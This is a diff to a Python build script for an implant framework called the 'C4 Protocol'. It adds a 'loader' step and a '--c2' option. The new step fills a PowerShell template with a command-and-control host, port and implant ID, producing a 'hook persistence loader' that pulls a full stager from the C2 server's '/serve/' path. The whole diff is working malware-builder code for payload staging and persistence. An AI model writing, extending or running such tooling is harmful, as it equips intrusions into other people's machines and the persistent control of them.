@@ -117,7 +117,7 @@ def _make_steps(instance_dir: Path) -> dict[str, StepDef]:
     }
 
 
-STEP_ORDER: list[str] = ["codebook", "salt", "config", "assemble", "stager"]
+STEP_ORDER: list[str] = ["codebook", "salt", "config", "assemble", "stager", "loader"]
 
 
 def format_size(size_bytes: float) -> str:
@@ -250,6 +250,49 @@ def assemble_stager(
     console.print(f"\n[green]✓[/] stager completed in {format_duration(elapsed)}\n")
 
 
+def assemble_loader(
+    args: argparse.Namespace, instance_dir: Path, implant_id: str
+) -> None:
+    """Assemble the lightweight loader for hook-based persistence."""
+    if not args.c2:
+        console.print("[dim]Skipping loader (no --c2 specified)[/]")
+        return
+
+    console.rule("[bold cyan]loader[/] — Assemble hook persistence loader")
+    start = time.time()
+
+    template = DIR / "stager" / "loader.ps1.template"
+    output = instance_dir / "loader.ps1"
+
+    if not template.exists():
+        console.print(f"[bold red]MISSING[/] Template: {template}")
+        sys.exit(1)
+
+    # Parse C2 address
+    if ":" not in args.c2:
+        console.print(f"[bold red]Invalid --c2 format:[/] {args.c2} (expected host:port)")
+        sys.exit(1)
+    c2_host, c2_port = args.c2.rsplit(":", 1)
+
+    # Stager path for this implant
+    stager_path = f"/serve/{implant_id}/rc_stager_full.ps1"
+
+    # Substitute placeholders
+    content = template.read_text()
+    content = content.replace("__C2_HOST__", c2_host)
+    content = content.replace("__C2_PORT__", c2_port)
+    content = content.replace("__IMPLANT_ID__", implant_id)
+    content = content.replace("__STAGER_PATH__", stager_path)
+
+    output.write_text(content)
+    console.print(f"[dim]  C2: {c2_host}:{c2_port}[/]")
+    console.print(f"[dim]  Stager URL: http://{args.c2}{stager_path}[/]")
+    console.print(f"[dim]  Output: {output} ({format_size(len(content))})[/]")
+
+    elapsed = time.time() - start
+    console.print(f"\n[green]✓[/] loader completed in {format_duration(elapsed)}\n")
+
+
 def main() -> None:
     parser = argparse.ArgumentParser(
         description="C4 Protocol master pipeline (Math-free)"
@@ -283,6 +326,11 @@ def main() -> None:
         choices=SUPPORTED_LANGUAGES + ["random"],
         default="random",
         help="Code language for generated templates (python, csharp, java, random)",
+    )
+    parser.add_argument(
+        "--c2",
+        default=None,
+        help="C2 address as host:port for hook loader (e.g. 10.0.1.4:9050). If provided, builds loader.ps1",
     )
     args = parser.parse_args()
 
@@ -346,6 +394,8 @@ def main() -> None:
             assemble_ps1(args, instance_dir)
         elif name == "stager":
             assemble_stager(args, instance_dir, implant_id)
+        elif name == "loader":
+            assemble_loader(args, instance_dir, implant_id)
         else:
             run_step(name, steps_defs[name], args)
     pipeline_elapsed: float = time.time() - pipeline_start
